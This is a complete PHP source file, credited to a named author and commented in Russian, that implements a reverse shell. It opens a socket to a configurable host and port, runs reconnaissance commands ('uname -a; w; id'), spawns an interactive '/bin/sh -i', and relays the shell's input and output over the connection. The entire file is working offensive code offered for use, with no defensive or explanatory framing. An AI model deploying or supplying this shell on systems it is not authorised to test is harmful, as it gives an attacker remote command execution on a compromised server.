<?php

    /**
     * Reverse Shell
     *
     * @author  Roman Grinko <rsgrinko@gmail.com>
     * @version 1.0.0
     */

    set_time_limit(0);

    /** Адрес подключения */
    const HOST  = '127.0.0.1';

    /** Порт подключения */
    const PORT  = 4444;

    /** Флаг отладки */
    const DEBUG = false;

    $chunkSize = 1400;
    $dataWrite = null;
    $dataError = null;
    $shell     = 'uname -a; w; id; /bin/sh -i';

    /**
     * Вывести строку
     *
     * @param string $string Строка
     *
     * @return void
     */
    function showLogData($string): void
    {
        echo $string . PHP_EOL;
    }

    chdir('/');
    umask(0);

    $socket = @fsockopen(HOST, PORT, $errorCode, $errorMessage, 30);
    if ($socket === false) {
        showLogData('Ошибка подключения: ' . $errorMessage . ' (' . $errorCode . ')');
        exit(1);
    }

    // Процесс создания оболочки
    $descriptorSpec = [
        0 => ['pipe', 'r'],  // stdin канал для чтения
        1 => ['pipe', 'w'],  // stdout канал для записи вывода
        2 => ['pipe', 'w'],  // stderr канал для записи ошибок
    ];

    $process = proc_open($shell, $descriptorSpec, $pipes);

    if (!is_resource($process)) {
        showLogData('Ошибка: не удалось создать оболочку');
        exit(1);
    }

    // Установить все в неблокирующий режим
    // Причина: иногда операции чтения блокируются, даже если выбранный поток сообщает нам, что этого не происходит
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($socket, 0);

    showLogData('Reverse Shell успешно открыт на ' . HOST . ':' . PORT);

    while (true) {
        // Проверяем соединение
        if (feof($socket)) {
            showLogData('Ошибка: Соединение закрыто');
            break;
        }

        // Проверка на конец STDOUT
        if (feof($pipes[1])) {
            showLogData('Ошибка: Соединение закрыто');
            break;
        }

        $dataRead            = [$socket, $pipes[1], $pipes[2]];
        $num_changed_sockets = stream_select($dataRead, $dataWrite, $dataError, null);

        // Если мы можем прочитать данные из сокета,
        // то отправляем данные в STDIN
        if (in_array($socket, $dataRead, true)) {
            if (DEBUG) {
                showLogData('Чтение сокета');
            }
            $input = fread($socket, $chunkSize);
            if (DEBUG){
                showLogData('Сокет: ' . $input);
            }
            fwrite($pipes[0], $input);
        }

        // Если мы можем прочитать данные STDOUT,
        // то отправляем данные в TCP соединение
        if (in_array($pipes[1], $dataRead, true)) {
            if (DEBUG) {
                showLogData('Чтение STDOUT');
            }
            $input = fread($pipes[1], $chunkSize);
            if (DEBUG) {
                showLogData('STDOUT: ' . $input);
            }
            fwrite($socket, $input);
        }

        // Если мы можем прочитать данные STDERR,
        // то отправляем данные в TCP соединение
        if (in_array($pipes[2], $dataRead, true)) {
            if (DEBUG) {
                showLogData('Чтение STDERR');
            }
            $input = fread($pipes[2], $chunkSize);
            if (DEBUG) {
                showLogData('STDERR: ' . $input);
            }
            fwrite($socket, $input);
        }
    }

    // Закрываем соединения
    fclose($socket);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
